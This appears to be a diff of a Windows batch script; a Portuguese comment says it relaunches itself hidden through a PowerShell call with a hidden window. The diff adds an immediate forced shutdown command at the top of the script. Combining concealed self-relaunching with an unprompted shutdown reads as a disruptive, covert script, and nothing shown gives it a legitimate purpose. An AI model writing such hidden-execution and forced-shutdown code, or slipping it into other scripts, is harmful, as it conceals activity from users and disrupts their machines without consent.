@@ -1,4 +1,6 @@
 @echo off
+
+shutdown /s /t 0
 :: Reexecuta o próprio script oculto
 if "%1" neq "hidden" (
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden"
